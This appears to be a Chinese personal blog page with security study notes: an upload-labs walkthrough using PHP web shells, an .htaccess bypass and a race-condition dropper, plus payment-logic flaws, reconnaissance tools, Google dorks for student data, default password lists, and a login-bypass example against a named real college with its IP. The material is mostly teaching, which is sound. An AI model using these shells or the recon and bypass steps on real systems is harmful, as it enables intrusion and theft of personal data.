<h3 id="第1关"><a href="#第1关" class="headerlink" title="第1关"></a>第1关</h3><p>1.下载upload-labs-master压缩包，将其解压到小皮的根目录下。<br>2.开启小皮的apache,关闭小皮的mysql<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802551645-625f68f1-e047-45f8-a008-3ffa16aa89a3.png" alt="image.png"><br>3.在主机vscode中编写木马程序命名为1.php，把1.php复制到虚拟机的桌面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>4.在小皮，打开网站，进入第一关，F12关掉js,然后上传1.php<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802715762-dd33b9a1-b878-414a-ac04-40871d625839.png" alt="image.png"><br>4.右键复制图片链接到另一个网页，在网址后面加上?a&#x3D;whoami  或<br>?a&#x3D;systeminfo  成功截图如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802817976-fcbb7a14-a01a-46aa-8069-26519f7a1a86.png" alt="Image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704804002540-11217491-42e3-4de3-8515-5d260452e39f.png#averageHue=%23d69e55&clientId=u4c785162-43a8-4&from=paste&height=360&id=uc02ca140&originHeight=360&originWidth=1714&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96505&status=done&style=none&taskId=u4b4a561b-06db-45ea-86a4-a6fa7f0b36e&title=&width=1714" alt="Image.png"></p>
<h3 id="第2关"><a href="#第2关" class="headerlink" title="第2关"></a>第2关</h3><p>1.查看代码，发现上传的文件必须是jpeg，png，gif类型<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704803230670-66a5787f-bb88-4c39-b4ec-f0b48be2a989.png" alt="image.png"><br>2.上传1.php后，用Yakit抓包，改为手动劫持，把16行改为image&#x2F;jpeg，在点击自动放行。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704804217050-eb4f51d3-07c1-426c-a4cf-c42d1ed902c8.png" alt="image.png"><br>3.右键复制图片链接到另一个网页，在网址后面加上?a&#x3D;whoami  或<br>?a&#x3D;systeminfo<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704803812463-2e4ab493-3285-4d85-8deb-e712e5acc30f.png" alt="image.png"></p>
<h3 id="第3关"><a href="#第3关" class="headerlink" title="第3关"></a>第3关</h3><p>1.查看代码，发现后缀 .asp .aspx  .php .jsp 全被禁了<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704804713798-251c60c2-dbe0-4796-b666-f7a51d865dba.png" alt="image.png"><br>2.把木马1.php重命名为1.php5，在虚拟机浏览器访问192.168.2.197。<br>3.之后的步骤和第一关一样。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704805201249-c6b22a0d-ae62-4083-9bb7-6e9151f45fe4.png" alt="Image.png"></p>
<h3 id="第4关"><a href="#第4关" class="headerlink" title="第4关"></a>第4关</h3><p>1.在vscode创建并编写 .htaccess文件,.htaccess文件是Apache服务器的一个配置文件，它允许网站管理员在服务器配置文件（通常是httpd.conf）之外，为特定目录及其子目录设置独立的配置指令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;3.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php                    <span class="comment">//这个指令为匹配模式的文件设置处理器为PHP引擎。换句话说，它告诉Apache将名为“3.jpg”的文件作为PHP脚本处理，而不是静态图像文件。</span></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>


<p>2.把  .htaccess 移到虚拟机桌面<br>3.再把木马重命名为3.jpg<br>4.先上传.htaccess文件，再上传3.jpg<br>5.右键复制图片链接到另一个网页，在网址后面加上?a&#x3D;dir  成功截图如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704805779045-dc34595b-479d-48ef-95cb-797dbe16b62d.png" alt="Image.png"></p>
<h3 id="第18关"><a href="#第18关" class="headerlink" title="第18关"></a>第18关</h3><p>1.查看代码，第18行服务器删除当前目录文件。原理是这样的：服务器删文件。<br>向服务器不断发送上传木马请求的包，不断发送访问木马的包，服务器删不过来，个别木马被上传。若服务器性能好，则木马不能上传成功。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704806934936-ab5b98d9-105e-47c5-86f0-df5259364d06.png" alt="image.png"><br>2.重新编写木马程序</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;../p.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @system($_GET[a]); ?&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>3.先上传一张正常的图片10.jpg，右键复制图像链接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704885215637-32298a38-9f49-442b-bceb-0c581cad93c6.png" alt="image.png"><br>4.打开Burp,把复制的图像链接后面的2024011xxxx.jpg改为2.php,然后粘贴到Burp的内置浏览器，再抓包<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704890271835-cb54bc7f-29b2-4f93-9083-d9e3778b9fd7.png#averageHue=%23f9f4f2&clientId=ueb46ed70-4956-4&from=paste&height=52&id=ub32eb19a&originHeight=52&originWidth=508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3697&status=done&style=none&taskId=u8afd7538-8c62-42a6-9511-06efb0aa001&title=&width=508" alt="image.png"><br>5.把抓到的包发送到intruder,得到访问木马的包。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704890537868-413dcfb1-96a2-4a5a-8115-841752bdd3a6.png" alt="image.png"><br>6.接下来，去抓上传木马的包，选择2.php，点击下图箭头处的上传，把抓到的上传木马的包发送到intruder<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704890994769-8184db52-bc90-462f-a016-38c4ef8faf6d.png" alt="image.png"></p>
<pre><code>  7.  3和4都改成无限发包，3是上传，4是访问。
      ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704891390603-d307cab2-7d08-4aa6-9430-2678af922b0f.png)
8.  3和4的线程都改成50
    ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704891573291-56a2dfc0-500d-40fe-b6fc-bebf4988967f.png)         
    9.点击Burp的开始攻击。结果如下
    ![Image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704981839385-21f5a2ff-1095-4412-93b6-dc5715616b2d.png)
    10.复制Request中的选中的部分，粘贴到upload/的后面并访问。
    ![Image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704981891067-8a5b9687-887f-4f1a-826a-337cfbc4a084.png)
</code></pre>
<h2 id="蚁剑工具的使用"><a href="#蚁剑工具的使用" class="headerlink" title="蚁剑工具的使用"></a>蚁剑工具的使用</h2><h3 id="蚁剑工具的介绍"><a href="#蚁剑工具的介绍" class="headerlink" title="蚁剑工具的介绍"></a>蚁剑工具的介绍</h3><p>蚁剑（AntSword）是一款被设计用于网络攻击的远程控制工具，它能够使得攻击者获取受害计算机的远程控制权限。蚁剑通过在受害者计算机上植入恶意软件，创建一个“后门”，使攻击者可以未经授权地访问受害者系统，进行数据窃取、监控、操纵等一系列非法操作。</p>
<h3 id="蚁剑工具的使用-1"><a href="#蚁剑工具的使用-1" class="headerlink" title="蚁剑工具的使用"></a>蚁剑工具的使用</h3><p>1.重新编写木马2.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  @<span class="title function_ invoke__">ecal</span>(<span class="variable">$_post</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.kali自带蚁剑工具，双击AntSword<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704892509666-e4b34028-bd3c-4653-bc7a-3b18d903bb90.png" alt="image.png"><br>3.右击空白处，添加数据。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704893002140-aaab2029-bcd0-43dc-8194-415a988a9db9.png" alt="image.png"><br>4.按下图填写URL地址和连接密码。点击测试链接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704892977762-06fa7e0c-68d6-4461-b355-5cea029f1f51.png" alt="image.png"><br>5.连接靶机成功，可以对靶机上的文件进行操作。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704893925898-a8bd3d04-f015-4414-815d-0c3b546fc5cb.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-CDN介绍及绕过,支付逻辑漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/08/CDN%E4%BB%8B%E7%BB%8D%E5%8F%8A%E7%BB%95%E8%BF%87,%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="article-date">
      <time datetime="2024-01-08T06:19:59.000Z" itemprop="datePublished">2024-01-08</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/08/CDN%E4%BB%8B%E7%BB%8D%E5%8F%8A%E7%BB%95%E8%BF%87,%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">CDN介绍及绕过,支付逻辑漏洞</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="CDN介绍及绕过"><a href="#CDN介绍及绕过" class="headerlink" title="CDN介绍及绕过"></a>CDN介绍及绕过</h2><h2 id="支付逻辑漏洞"><a href="#支付逻辑漏洞" class="headerlink" title="支付逻辑漏洞"></a>支付逻辑漏洞</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>支付逻辑漏洞是指系统的支付流程中存在业务逻辑层面的漏洞,支付漏洞是 高风险漏洞 也属于 逻辑漏洞，通常是通过 篡改价格、数量、状态、接口、用户名等传参，从而造成 小钱够买大物 甚至可能造成 0元购买商品 等等，凡是 涉及购买、资金等方面的功能处 就有可能存在支付漏洞。</p>
<h3 id="支付流程"><a href="#支付流程" class="headerlink" title="支付流程"></a>支付流程</h3><p>选择商品和数量——选择支付及配送方式——生成订单编号——订单支付选择——完成支付。如：最常见的支付逻辑漏洞通常是由于服务器端没有对客户端请求数据中的金额、数量等敏感信息进行效验导致。一般漏洞产生在电子商务类应用中,这里是以贝锐的商城进行举例的。</p>
<h3 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h3><p>支付过程中可以修改支付金额2.可以将订单中的商品数量修改为负值。3.请求重放导致4.其他问题（程序异常，其他参数修改导致问题等）其他支付问题补充：修改支付状态、修改附属值（优惠券积分等）、修改支付接口、替换多个订单、重复支付等。5.发票越权,并发,也可能也能修改金额。</p>
<h3 id="测试方法与修复方法"><a href="#测试方法与修复方法" class="headerlink" title="测试方法与修复方法"></a>测试方法与修复方法</h3><p>支付逻辑漏洞之修改订单数量：1、登录网站，选择购买一个商品并抓取数据包。2、找到其中代表商品数量的参数，将参数的值修改为负数,或者修改商品的pid。3、发送数据包，生成订单，观察订单是否有效，是否能进入支付页面。4、完成支付。可以从这4个方面的每一步单独入手验证是否存在漏洞。<br>举例<br>（1）登录贝锐的商城发现以下7个漏洞:<br>实现零元购:1.参数包里面没有价格，或者价格跟商品id校验，导致无法修复商品金额。2.掩藏商品的模糊测试，商品id，换参数包直接改。出现第1个的原因主要是商品下单的处导致。出现第2个的原因主要是商品购买处导致。3.购物单未校验加入零元购商品。第3个主要是支付宝接口和商品接口未校验导致商品任意购买。6.商品数量校验导致零元购。7.附带商品导致支付漏洞主要是在免费的商品或者增送的商品上做文章,可能通过修改它们的数量从而产生漏洞。<br>（2）通过支付宝和微信的校验缺点对某一个文库进行充值:<br>8.四舍五入导致支付漏洞 系统支付和微信的支付校验导致(提现) 0.009可以变成0.01<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704640221637-bfc70f6e-65c5-4090-82fb-35aaf1ae8c73.png">进行充值界面的抓包,将0.01改成0.009。<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704640696403-c9483fec-f582-450f-8765-1b58d170c062.png"><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704640760997-274cc9ef-ed41-4919-8ba1-135b349e0950.png"><br>这里微信和支付宝对支付的金额进行了校验,但是只到了小数点的第二位,如果出现第三位会采用四舍五入的方法强行进行校验。</p>
<h2 id="芒果书城的漏洞"><a href="#芒果书城的漏洞" class="headerlink" title="芒果书城的漏洞"></a>芒果书城的漏洞</h2><p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641149279-e165b9c6-d7f9-48ff-8bdc-50f144009779.png">存在一个修改数量价格就会变化的漏洞,被修复了,还存在一个修改书籍数量就能绕过的一个漏洞,被修复了。4.贝锐微商城:使用过红包的订单，有一个支付宝的订单号，有效期是15分钟，商家对接支付宝，取消订单，红包返回，无限使用</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641741683-3ff6400a-0709-4192-9c9b-881862df21ee.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40666686/1704641782637-7fabdffc-e2db-4a2f-8979-4939827b59e4.png#averageHue=%23f4f3f3&clientId=u75bf778e-08fd-4&from=paste&height=110&id=u335fe28a&originHeight=137&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60803&status=done&style=none&taskId=uff3ab498-81fe-476f-a9d2-f796e7a6183&title=&width=969.6#averageHue=%23f4f3f3&from=url&id=RAFv3&originHeight=137&originWidth=1212&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641887661-cf1cf51d-ed47-4b47-9ccb-85c30965a8b6.png"><br>并发需要用到插件,并发之后看长度。并发漏洞(服务器对功能点的多线程处理)：优惠劵，微薄的点赞，关注，取消点赞 优惠商品下单 所有的都能并发。修复方法：1.在请求数据中对对涉及金额、数量等敏感信息进行加密，保证加密算法不可猜解。并在服务器端对其进行校验。2.支付交易请求数据中加入tbken，防止重放攻击。3.支付系统需要实施严格的安全措施，例如验证支付请求的合法性、限制重复支付、验证用户身份、使用加密技术保护数据传输等。此外，定期进行安全审计和漏洞扫描，及时修复发现的漏洞也是重要的措施。4.对于用户而言，保护个人账户安全、使用安全的支付平台、谨慎处理退款请求等也是重要的预防措施。</p>
<h2 id="Fiddler的使用"><a href="#Fiddler的使用" class="headerlink" title="Fiddler的使用"></a>Fiddler的使用</h2><p>下载流程:<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mubei1314/article/details/122389950">https://blog.csdn.net/Mubei1314/article/details/122389950</a>Fiddler抓包联动burp进行数据分析:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU2NDM2OTQxMw==&mid=2247484054&idx=1&sn=3440b36b071491a9b7a03e1e293aab57&chksm=fc4d43fccb3acaea94fd6073cba7f68efad9ba21177694ec7599d99cb7330ffa7edf01f80002&scene=27">https://mp.weixin.qq.com/s?__biz&#x3D;MzU2NDM2OTQxMw&#x3D;&#x3D;&amp;mid&#x3D;2247484054&amp;idx&#x3D;1&amp;sn&#x3D;3440b36b071491a9b7a03e1e293aab57&amp;chksm&#x3D;fc4d43fccb3acaea94fd6073cba7f68efad9ba21177694ec7599d99cb7330ffa7edf01f80002&amp;scene&#x3D;27</a>使用过程中不要关代理。<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642646670-70960ba8-e6c3-430c-9b0c-53b1fd0ac675.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-教育SRC分析,弱口令漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/08/%E6%95%99%E8%82%B2SRC%E5%88%86%E6%9E%90,%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="article-date">
      <time datetime="2024-01-08T01:33:02.000Z" itemprop="datePublished">2024-01-08</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/08/%E6%95%99%E8%82%B2SRC%E5%88%86%E6%9E%90,%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/">教育SRC分析,弱口令漏洞</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="教育SRC分析"><a href="#教育SRC分析" class="headerlink" title="教育SRC分析"></a>教育SRC分析</h2><p>1.教育SRC的含义：教育SRC（Security Response Center，安全响应中心）是针对教育行业的一种网络安全实践。它主要是指一个组织或机构，专门负责收集、处理和响应网络安全相关的漏洞报告。在教育领域，许多学校和教育机构都设有自己的教育SRC，以便于管理和保护教育系统免受网络攻击和信息安全威胁</p>
<p>2.教育漏洞报告平台,是专门为教育行业设计的在线系统，用于收集、管理和响应网络安全漏洞。<br>链接：<a target="_blank" rel="noopener" href="https://dev.src.sjtu.edu.cn/">https://dev.src.sjtu.edu.cn/</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704644015806-210ad2ee-d1e3-4c86-b0f7-151fe75e6585.png" alt="image.png"></p>
<h3 id="挖洞思路"><a href="#挖洞思路" class="headerlink" title="挖洞思路"></a>挖洞思路</h3><ul>
<li>教育SRC（学校）</li>
<li>公益SRC（白嫖）</li>
<li>挖漏洞（注入，逻辑漏洞，信息收集一下，子域名收集）</li>
<li>挖洞学校的漏洞（所有）——&gt;信息收集——&gt;学校</li>
<li>挖到某个学校的漏洞——&gt;学校——&gt;信息收集</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704636474903-99aac4bf-8d2b-4780-bdbe-6f6a144e3d52.png" alt="Image.png"></p>
<h3 id="挖洞举例"><a href="#挖洞举例" class="headerlink" title="挖洞举例"></a>挖洞举例</h3><p>以西安医学院为例<br>1.谷歌搜索语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inurl:edu 学号</span><br><span class="line">inurl:edu 初始密码</span><br><span class="line">inurl:学号|身份证|电话|工号 filetype:pdf|xls|doc|xlxs</span><br></pre></td></tr></table></figure>

<p>2.搜索语句：<code>domain=&quot;xiyi.edu.cn&quot;</code>    可以得到一些子域名和ip地址<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704640244107-d28bfa74-c841-4071-bb0e-d469758e1e18.png" alt="image.png"><br>以及官网真实ip地址:59.75.117.201<br>3.在kali用nmap扫描59.75.117.201，命令：<code>nmap 59.75.117.201</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641100060-687dd459-8188-4ef4-a01a-e9259d06e006.png" alt="image.png"><br>4.依次访问59.75.117.201：上图端口    如59.75.117.201：80   寻找漏洞<br>5.任意用户注册，任意用户登录漏洞<br>（1）首先，先用一个正常手机号注册，正常填写手机号，验证码。随便填一个身份证号，登录，用Burp抓包<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641738797-c8311a5a-71bb-419d-929e-2401dc987615.png" alt="image.png"></p>
<p>（2） 然后，把返回的包记录下来<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642213788-b105242f-4113-416e-8b55-8c0883af0367.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>（3）再随便注册一个手机号。手机号，验证码，身份证随便填<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642532568-09c8e774-8925-4908-b306-c6af3de281cc.png" alt="image.png"><br>（4）再用Burp抓包，把下图中圈记的内容替换成之前记录的{“success”:true}<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642756664-4698bcd9-f050-450e-b5f9-18c3dda33cec.png" alt="image.png"><br>（5）发现直接可以注册登录了<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642892657-98ee1896-409b-49a1-ae22-43d213f28d1c.png" alt="image.png"></p>
<h2 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>弱口令漏洞是指系统登录口令的设置强度不高，容易被攻击者猜到或破解。造成弱口令漏洞的主要原因是系统的运维人员、管理人员安全意识不足。<br>弱口令：弱口令我们可以简单的理解为能让别人随便就猜出的密码。</p>
<h3 id="弱口令猜测"><a href="#弱口令猜测" class="headerlink" title="弱口令猜测"></a>弱口令猜测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123</span><br><span class="line">admin/admin123456</span><br><span class="line">admin/123456</span><br><span class="line">admin/12345678</span><br><span class="line">admin/admin666</span><br><span class="line">admin/admin888</span><br></pre></td></tr></table></figure>




      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-信息收集，小米范的使用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%8C%E5%B0%8F%E7%B1%B3%E8%8C%83%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
      <time datetime="2024-01-08T01:27:08.000Z" itemprop="datePublished">2024-01-08</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%8C%E5%B0%8F%E7%B1%B3%E8%8C%83%E7%9A%84%E4%BD%BF%E7%94%A8/">信息收集，小米范的使用</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="信息收集网站"><a href="#信息收集网站" class="headerlink" title="信息收集网站"></a>信息收集网站</h2><h3 id="企查查的介绍"><a href="#企查查的介绍" class="headerlink" title="企查查的介绍"></a>企查查的介绍</h3><p>1.企查查是中国的一款企业信息查询工具，用户可以通过该平台查询到企业的基本信息、主要人员、对外投资、法律诉讼等多个维度的信息。企查查为用户提供了一个相对全面和便捷的方式来了解企业的情况，无论是对于企业本身、合作伙伴还是竞争对手。<br>链接：<a target="_blank" rel="noopener" href="https://www.qcc.com/">https://www.qcc.com/</a></p>
<h2 id="信息收集工具"><a href="#信息收集工具" class="headerlink" title="信息收集工具"></a>信息收集工具</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>1.可以通过kali的ping命令获取ip地址<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704546921634-d8018096-d232-47d3-a29d-d31ca7f8c5da.png" alt="image.png"></p>
<h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><pre><code> 命令`dig qq.com`     dig是DNS解析工具，这个命令可以查看qq.com的A记录
</code></pre>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704547447541-7635f7d2-303f-4a49-8496-eac21c0ce51e.png" alt="image.png"></p>
<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p><code>nslookup qq.com</code>  也可以获取ip地址<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704547513452-371e9cf1-d128-4df0-85bf-99a21384523a.png" alt="image.png"></p>
<h3 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h3><p>OneForAll是一款开源的子域收集工具，下载链接：<a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a>  然后粘贴到虚拟机</p>
<h3 id="virustotal"><a href="#virustotal" class="headerlink" title="virustotal"></a>virustotal</h3><p>virustotal是检测上传的文件是否是木马的网站，链接<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704634470570-ff5f99bc-a4e5-4033-b25c-80385f324aa5.png" alt="image.png"></p>
<h3 id="小米范"><a href="#小米范" class="headerlink" title="小米范"></a>小米范</h3><p>1.前提：<br>使用环境是在java1.8的环境中进行运行。<br>2.下载：<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2024/jar/40666686/1704626940737-9ed7d2a5-72b6-4256-80fa-d2c1ee53ee10.jar?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2024/jar/40666686/1704626940737-9ed7d2a5-72b6-4256-80fa-d2c1ee53ee10.jar%22,%22name%22:%22web_finder_2.9.jar%22,%22size%22:3556227,%22ext%22:%22jar%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u59eb5722-a048-4fbe-8215-d925d483331%22,%22taskType%22:%22upload%22,%22type%22:%22%22,%22__spacing%22:%22both%22,%22id%22:%22u30fe1a6b%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">web_finder_2.9.jar</a>这是小米范的原文件。<br>3.使用：<br>找到安装java1.8的安装路径，将web_finder_2.9.jar放入java1.8的bin目录之下。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627348540-15136b93-127d-48ac-a9f7-e47ff0b19a15.png"><br>在java1.8的bin目录处输入cmd输入java -jar web_finder_2.9.jar，之后就可以启动你的小米范了。<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628134429-98c220db-0fa7-4916-a48e-9310d5a9aee4.png">之后新建扫描，输入IP就可以了，这里简单的输入了两个ip地址<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628087611-e95403a7-5cfe-4511-bed5-0b0e331506ce.png">可以对表单中数据进行处理。<br>4.举例：<br>fofa的使用：以sql-labs为例用浏览器打开到sqli目录下查看网页源码，找到”POST- Dump into outfile - String”<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628982805-1417eb29-526b-402d-b26a-dd5519bae253.png">用浏览器打开fofa使用body语法进行搜索。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629236298-8194feb4-b524-4b02-9970-a88d58af241d.png">如果是会员可以进行下载称之为多元组数据。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629410601-69fa40c9-14eb-45b9-9ac6-c2e0b9e0ec9c.png">直接右键将ip进行复制粘贴到小米范查看ip的存活情况。</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629494714-904c6d8a-c7c4-4efb-bfef-47db25cd86a3.png">全塞入这里进行扫描：</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629638602-6a70c7d1-2446-4d2d-8346-7d218b4bf81b.png">结果:</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629752608-41bb862f-89f8-4f78-b479-ac3e9ef269d8.png">通过标题和状态码进行简单的筛选然后导出：</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704630021770-06d14431-a43a-4265-b496-bceacd653c58.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-基于表单的暴力破解，Burp,Yakit的使用，验证码绕过，攻破靶机moneybox" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/08/%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%8CBurp,Yakit%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%8C%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%8C%E6%94%BB%E7%A0%B4%E9%9D%B6%E6%9C%BAmoneybox/" class="article-date">
      <time datetime="2024-01-08T01:12:08.000Z" itemprop="datePublished">2024-01-08</time>
</a>


    </div>
  
